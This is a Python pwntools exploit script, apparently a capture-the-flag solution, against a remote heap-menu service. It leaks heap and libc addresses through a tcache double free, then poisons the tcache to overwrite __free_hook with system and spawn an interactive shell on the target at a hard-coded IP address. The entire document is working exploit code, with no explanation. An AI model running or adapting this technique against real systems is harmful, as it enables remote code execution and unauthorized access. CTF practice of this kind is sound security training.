from pwn import *
#p=process('./1')
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
p=remote('34.121.211.139',4444)
libc=ELF('libc-2.27.so')


context.terminal = ['tmux','splitw','-h']
def debug():
    gdb.attach(p)
    pause()
def add(size,con):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('enter the size')
    p.sendline(str(size))
    p.recvuntil('Enter data')
    p.send(str(con))
def view():
    p.recvuntil('choice :')
    p.sendline('2')
def delete():
    p.recvuntil('choice :')
    p.sendline('3')
add(0x90,'aaaa')
delete()
delete()
view()
p.recv()
p.recvuntil('Printing the data inside\n')
heap_base=u64(p.recvline().strip('\n').ljust(8,'\x00'))-0x260
print hex(heap_base)
add(0x90,'a')
#print hex(heap_base)
add(0x30,'bbbb')
for i in range(7):
    delete()
add(0x90,'zxcv')
for i in range(8):
    delete()
view()
p.recv()
#libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-libc.sym['main_arena']
libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-0x3ebc40
print hex(libc.address)
print hex(libc.sym['__free_hook'])
print hex(libc.sym['system'])
add(0x30,p64(libc.sym['__free_hook']))
add(0x30,p64(libc.sym['system']))
add(0x30,p64(libc.sym['system']))
add(0x30,'/bin/sh\x00')
delete()
p.interactive()

